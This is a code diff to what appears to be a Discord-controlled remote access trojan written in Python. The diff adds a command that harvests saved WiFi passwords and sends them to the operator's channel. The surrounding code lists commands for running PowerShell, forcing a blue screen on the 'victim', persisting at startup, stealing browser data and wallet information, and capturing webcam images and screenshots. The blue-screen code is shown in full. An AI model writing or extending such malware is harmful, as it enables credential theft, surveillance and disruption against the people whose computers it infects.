@@ -5,6 +5,7 @@ from tkinter import messagebox
 from config import TOKEN, GUILD_ID, DEFENDER, ERROR
 from modules.browser import run, delete_files
 #from modules.keylogger import Keylogger
+from modules.wifi import WifiPasswords
 from dotenv import load_dotenv
 
 
@@ -40,13 +41,13 @@ commands = "\n".join([
     "upload <link> - Upload file",
     "cmd <command> - Execute powershell command",
     "run <file> - Run an file",
+    "wifi - Return wifi passwords",
     "screenshot - Take a screenshot",
     "bluescreen - Blue screen victim",
     "startup - Add to startup",
     "browser - Get browser data",
     "webcam - Get image of webcam",
     "wallet - Get wallet information",
-    #"keylogger - Enable keylogger"
     "!exit - Exit session and delete all data"
 ])
 
@@ -224,10 +225,22 @@ async def on_message(message):
         res = ctypes.c_ulong()
         ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
         if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
-            await message.reply("Blue Successful!")
+            await message.reply("Bluescreen Successful!")
         else:
-            await message.reply("Blue Failed! :(")
+            await message.reply("Bluescreen Failed!")
 
+
+    elif message.content == "wifi":
+        WifiPasswords().run()
+        with open("wifi.txt", "r") as f:
+            wifi = f.read()
+        if wifi == "":
+            wifi = "No wifi passwords found!"
+        embed = discord.Embed(title="Wifi Passwords", description=f"```{wifi}```", color=0xfafafa)
+        await message.reply(embed=embed)
+        delete_files(["wifi.txt"])
+
+    
     elif message.content == "screenshot":
         try:
             screenshot = ImageGrab.grab(all_screens=True)
